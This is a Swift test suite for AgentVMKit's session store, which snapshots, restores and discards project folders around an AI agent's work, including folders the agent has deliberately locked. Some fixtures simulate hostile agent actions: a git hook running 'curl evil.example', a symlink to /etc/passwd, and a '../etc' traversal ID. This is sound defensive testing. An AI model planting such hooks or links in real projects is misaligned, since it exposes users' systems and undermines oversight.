// Tests/AgentVMKitTests/SessionStoreTests.swift
//
// Live-mode sessions against real folders on the test machine's APFS volume: snapshot
// fidelity, undo restoring the exact tree, discard surviving agent-hostile trees, and the
// refusals that keep a session from covering too much.

import Darwin
import Foundation
import Testing
@testable import AgentVMKit

@Suite struct SessionStoreTests {
    // MARK: - start

    @Test func startSnapshotsTheWholeTree() throws {
        let scratch = try Scratch()
        try scratch.populate()
        let session = try scratch.store.start(project: scratch.project.path)

        #expect(session.record.state == .active)
        #expect(session.record.project == scratch.project.path)
        #expect(try describeTree(session.snapshotPath) == describeTree(scratch.project.path))
    }

    @Test func snapshotIsIndependentOfLaterChanges() throws {
        let scratch = try Scratch()
        try scratch.populate()
        let session = try scratch.store.start(project: scratch.project.path)
        try scratch.write("README.md", "changed by the agent\n")

        let snapshotReadme = try String(contentsOfFile: session.snapshotPath + "/README.md", encoding: .utf8)
        #expect(snapshotReadme == "hello\n")
    }

    @Test func startRecordsATimeBeforeTheSnapshot() throws {
        let scratch = try Scratch()
        try scratch.populate()
        let before = Date()
        let session = try scratch.store.start(project: scratch.project.path)
        #expect(session.record.startedAt >= before.addingTimeInterval(-1))
        #expect(session.record.startedAt <= Date())
    }

    @Test func secondActiveSessionOnTheSameProjectIsRefused() throws {
        let scratch = try Scratch()
        try scratch.populate()
        let first = try scratch.store.start(project: scratch.project.path)
        #expect(throws: AgentVMError.sessionAlreadyActive(project: scratch.project.path, id: first.id)) {
            try scratch.store.start(project: scratch.project.path)
        }
        try scratch.store.end(id: first.id)
        let second = try scratch.store.start(project: scratch.project.path)
        #expect(second.id != first.id)
    }

    @Test func unsuitableProjectsAreRefused() throws {
        let scratch = try Scratch()
        try scratch.write("file.txt", "x")
        let store = scratch.store

        func expectRefused(_ path: String) {
            #expect(throws: AgentVMError.self) { try store.start(project: path) }
        }
        expectRefused("/")
        expectRefused(NSHomeDirectory())
        expectRefused((NSHomeDirectory() as NSString).deletingLastPathComponent) // contains home
        expectRefused(scratch.path("file.txt"))                                 // not a folder
        expectRefused(scratch.path("does-not-exist"))
        expectRefused(scratch.root.path)                                         // contains the store
        #expect(try store.list().isEmpty)
    }

    @Test func projectInsideTheStoreIsRefused() throws {
        let scratch = try Scratch()
        let inside = scratch.store.root.appendingPathComponent("Sessions/inner", isDirectory: true)
        try FileManager.default.createDirectory(at: inside, withIntermediateDirectories: true)
        #expect(throws: AgentVMError.self) { try scratch.store.start(project: inside.path) }
    }

    // MARK: - undo

    @Test func undoRestoresTheExactTreeAndKeepsWhatWasReplaced() throws {
        let scratch = try Scratch()
        try scratch.populate()
        let original = try describeTree(scratch.project.path)
        let session = try scratch.store.start(project: scratch.project.path)

        // What an agent might do: edit, add, delete, plant a hook, change modes, add links.
        try scratch.write("README.md", "rewritten\n")
        try scratch.write("new/file.txt", "added\n")
        try FileManager.default.removeItem(atPath: scratch.path("Sources/App/main.swift"))
        try scratch.write(".git/hooks/pre-commit", "#!/bin/sh\ncurl evil.example\n")
        chmod(scratch.path("build.sh"), 0o644)
        symlink("/etc/passwd", scratch.path("escape"))
        let agentTree = try describeTree(scratch.project.path)

        let undone = try scratch.store.undo(id: session.id)

        #expect(undone.record.state == .undone)
        #expect(try describeTree(scratch.project.path) == original)
        let replaced = try #require(undone.replacedTreePath)
        #expect(try describeTree(replaced) == agentTree)
        #expect(try describeTree(undone.snapshotPath) == original)
        #expect(try scratch.store.session(id: session.id).record.state == .undone)
    }

    @Test func undoWorksAfterEndButOnlyOnce() throws {
        let scratch = try Scratch()
        try scratch.populate()
        let session = try scratch.store.start(project: scratch.project.path)
        try scratch.write("README.md", "agent\n")
        try scratch.store.end(id: session.id)
        try scratch.store.undo(id: session.id)
        #expect(try scratch.read("README.md") == "hello\n")
        #expect(throws: AgentVMError.wrongSessionState(id: session.id, state: "undone", operation: "undo")) {
            try scratch.store.undo(id: session.id)
        }
    }

    @Test func undoRefusesWhenTheProjectIsGone() throws {
        let scratch = try Scratch()
        try scratch.populate()
        let session = try scratch.store.start(project: scratch.project.path)
        try FileSystem.removeTree(scratch.project.path)
        #expect(throws: AgentVMError.projectMissing(path: scratch.project.path)) {
            try scratch.store.undo(id: session.id)
        }
    }

    // MARK: - end, list, discard

    @Test func endOnlyAppliesToActiveSessions() throws {
        let scratch = try Scratch()
        try scratch.populate()
        let session = try scratch.store.start(project: scratch.project.path)
        let ended = try scratch.store.end(id: session.id)
        #expect(ended.record.state == .ended)
        #expect(ended.record.endedAt != nil)
        #expect(throws: AgentVMError.wrongSessionState(id: session.id, state: "ended", operation: "end")) {
            try scratch.store.end(id: session.id)
        }
    }

    @Test func listReturnsSessionsOldestFirstAndIgnoresStrayFolders() throws {
        let scratch = try Scratch()
        try scratch.populate()
        let first = try scratch.store.start(project: scratch.project.path)
        try scratch.store.end(id: first.id)
        let second = try scratch.store.start(project: scratch.project.path)
        try FileManager.default.createDirectory(
            at: scratch.store.sessionsDirectory.appendingPathComponent("not-a-session"),
            withIntermediateDirectories: true)

        let ids = try scratch.store.list().map(\.id)
        #expect(ids == [first.id, second.id])
    }

    @Test func aDamagedRecordDoesNotBlockOtherSessions() throws {
        let scratch = try Scratch()
        try scratch.populate()
        let first = try scratch.store.start(project: scratch.project.path)
        try scratch.store.end(id: first.id)
        try Data("not json".utf8).write(to: first.directory.appendingPathComponent("session.json"))

        let second = try scratch.store.start(project: scratch.project.path)
        let (sessions, problems) = try scratch.store.listWithProblems()
        #expect(sessions.map(\.id) == [second.id])
        #expect(problems.count == 1)
    }

    @Test func discardDeletesAgentHostileTrees() throws {
        let scratch = try Scratch()
        try scratch.populate()
        let session = try scratch.store.start(project: scratch.project.path)

        // Things an agent can do to make its leftovers hard to delete.
        try scratch.write("locked/inner/file.txt", "x")
        chmod(scratch.path("locked/inner"), 0o000)
        chmod(scratch.path("locked"), 0o500)
        try scratch.write("immutable.txt", "x")
        chflags(scratch.path("immutable.txt"), UInt32(UF_IMMUTABLE))
        try scratch.store.undo(id: session.id)
        let replaced = try #require(try scratch.store.session(id: session.id).replacedTreePath)

        let discarded = try scratch.store.discard(id: session.id)
        #expect(discarded.record.state == .discarded)
        #expect(!FileSystem.exists(discarded.snapshotPath))
        #expect(!FileSystem.exists(replaced))
        #expect(try scratch.store.session(id: session.id).record.state == .discarded)
        #expect(throws: AgentVMError.wrongSessionState(id: session.id, state: "discarded", operation: "discard")) {
            try scratch.store.discard(id: session.id)
        }
    }

    @Test func discardNeverFollowsSymlinksOutOfTheSession() throws {
        let scratch = try Scratch()
        try scratch.populate()
        let outside = scratch.root.appendingPathComponent("outside", isDirectory: true)
        try FileManager.default.createDirectory(at: outside, withIntermediateDirectories: true)
        try Data("keep".utf8).write(to: outside.appendingPathComponent("keep.txt"))
        symlink(outside.path, scratch.path("link-out"))

        let session = try scratch.store.start(project: scratch.project.path)
        try scratch.store.discard(id: session.id)
        #expect(FileSystem.exists(outside.appendingPathComponent("keep.txt").path))
    }

    // MARK: - awkward but legitimate projects, and agents that lock things down

    @Test func readOnlyFoldersAreSnapshottedAndRestored() throws {
        let scratch = try Scratch()
        try scratch.populate()
        try scratch.write("vendor/pkg/inner/file.go", "package inner\n")
        symlink("file.go", scratch.path("vendor/pkg/inner/link.go"))       // copyfile makes symlinks last
        try scratch.write("shared/notes.txt", "notes\n")
        try addACL("everyone deny add_file,add_subdirectory", to: scratch.path("shared"))
        try addACL("everyone deny delete", to: scratch.path("shared/notes.txt"))
        chmod(scratch.path("vendor/pkg/inner"), 0o555)
        chmod(scratch.path("vendor/pkg"), 0o555)
        chmod(scratch.project.path, 0o555)
        defer { chmod(scratch.project.path, 0o755) }
        let original = try describeTree(scratch.project.path)

        let session = try scratch.store.start(project: scratch.project.path)
        #expect(try describeTree(session.snapshotPath) == original)
        #expect(hasACL(session.snapshotPath + "/shared") && hasACL(session.snapshotPath + "/shared/notes.txt"))
        chmod(scratch.project.path, 0o755)
        try scratch.write("added.txt", "agent\n")
        try scratch.store.undo(id: session.id)
        #expect(try describeTree(scratch.project.path) == original)
        #expect(try FileSystem.status(scratch.project.path).st_mode & 0o7777 == 0o555)
        #expect(hasACL(scratch.path("shared")) && hasACL(scratch.path("shared/notes.txt")))
    }

    @Test func socketsAndFIFOsAreLeftOutOfTheSnapshot() throws {
        let scratch = try Scratch()
        try scratch.populate()
        let original = try describeTree(scratch.project.path)
        #expect(mkfifo(scratch.path(".git/fifo"), 0o600) == 0)

        let session = try scratch.store.start(project: scratch.project.path)
        #expect(!FileSystem.exists(session.snapshotPath + "/.git/fifo"))
        #expect(try describeTree(session.snapshotPath) == original)
    }

    @Test func failedSnapshotReportsTheCauseAndLeavesNothingBehind() throws {
        let scratch = try Scratch()
        try scratch.populate()
        chmod(scratch.path("README.md"), 0o000)
        #expect(throws: AgentVMError.self) { try scratch.store.start(project: scratch.project.path) }
        do {
            try scratch.store.start(project: scratch.project.path)
        } catch let AgentVMError.system(_, code) {
            #expect(code == EACCES)
        }
        #expect(try scratch.store.list().isEmpty)
        let leftovers = try FileManager.default.contentsOfDirectory(atPath: scratch.store.sessionsDirectory.path)
        #expect(leftovers.filter(SessionStore.isValidID).isEmpty)
    }

    enum Lock: String, CaseIterable {
        case readOnly, immutable, denyDelete, denyReadSecurity, denyEverything
    }

    @Test(arguments: Lock.allCases)
    func undoIsNotBlockedByALockedProjectFolder(lock: Lock) throws {
        let scratch = try Scratch()
        try scratch.populate()
        try addACL("everyone deny delete", to: scratch.path("README.md"))  // the user's own ACL
        let original = try describeTree(scratch.project.path)
        let session = try scratch.store.start(project: scratch.project.path)
        try scratch.write("added.txt", "agent\n")

        switch lock {
        case .readOnly: chmod(scratch.project.path, 0o555)
        case .immutable: chflags(scratch.project.path, UInt32(UF_IMMUTABLE))
        case .denyDelete: try addACL("everyone deny delete", to: scratch.project.path)
        case .denyReadSecurity: try addACL("everyone deny readsecurity", to: scratch.project.path)
        case .denyEverything:
            try addACL("everyone deny delete,readsecurity,list,add_file,add_subdirectory,delete_child", to: scratch.project.path)
        }
        let undone = try scratch.store.undo(id: session.id)

        #expect(try describeTree(scratch.project.path) == original)
        #expect(!hasACL(scratch.project.path))
        #expect(hasACL(scratch.path("README.md")))
        let replaced = try #require(undone.replacedTreePath)
        let replacedInfo = try FileSystem.statusRemovingUnreadableACL(replaced)
        switch lock {
        case .readOnly: #expect(replacedInfo.st_mode & 0o7777 == 0o555)
        case .immutable: #expect(replacedInfo.st_flags & UInt32(UF_IMMUTABLE) != 0)
        case .denyDelete: #expect(hasACL(replaced))
        case .denyReadSecurity, .denyEverything: break  // unreadable, so not kept
        }
        try scratch.store.discard(id: session.id)
        #expect(!FileSystem.exists(replaced))
    }

    @Test func discardDeletesTreesLockedWithACLs() throws {
        let scratch = try Scratch()
        try scratch.populate()
        let session = try scratch.store.start(project: scratch.project.path)
        try scratch.write("acl/sub/file.txt", "x")
        try addACL("everyone deny delete,readsecurity", to: scratch.path("acl/sub/file.txt"))
        try addACL("everyone deny delete_child,list,search,readsecurity", to: scratch.path("acl/sub"))
        try addACL("everyone deny delete_child", to: scratch.path("acl"))
        symlink("README.md", scratch.path("acl/link"))
        try addACL("everyone deny delete,readsecurity", to: scratch.path("acl/link"))
        try scratch.store.undo(id: session.id)
        let replaced = try #require(try scratch.store.session(id: session.id).replacedTreePath)
        try addACL("everyone deny delete,readsecurity,list", to: replaced)

        try scratch.store.discard(id: session.id)
        var info = stat()
        #expect(lstat(replaced, &info) == -1 && errno == ENOENT)
        #expect(hasACL(scratch.path("README.md")) == false)  // the link target was not touched
    }

    @Test func foundationErrorsAreReportedWithTheirPOSIXCode() {
        do {
            try FileManager.default.removeItem(atPath: "/nonexistent-agent-vm-\(UUID().uuidString)")
            Issue.record("removing a missing path succeeded")
        } catch {
            #expect(FileSystem.posixCode(error) == ENOENT)
        }
    }

    // MARK: - ids and records

    @Test func malformedIDsAreRejectedBeforeTouchingTheDisk() throws {
        let scratch = try Scratch()
        for id in ["../etc", "20260923-120000-zzzz", "", "20260923-120000-abcd/..", "x"] {
            #expect(throws: AgentVMError.invalidSessionID(id)) { try scratch.store.session(id: id) }
        }
        #expect(throws: AgentVMError.sessionNotFound("20260923-120000-abcd")) {
            try scratch.store.session(id: "20260923-120000-abcd")
        }
    }

    @Test func generatedIDsHaveTheDocumentedShape() {
        let id = SessionStore.newID()
        #expect(SessionStore.isValidID(id))
    }

    @Test func defaultRootHonorsAgentVMHome() {
        #expect(SessionStore.defaultRoot(environment: ["AGENT_VM_HOME": "/tmp/x"]).path == "/tmp/x")
        #expect(SessionStore.defaultRoot(environment: [:]).path.hasSuffix("Library/Application Support/agent-vm"))
    }
}
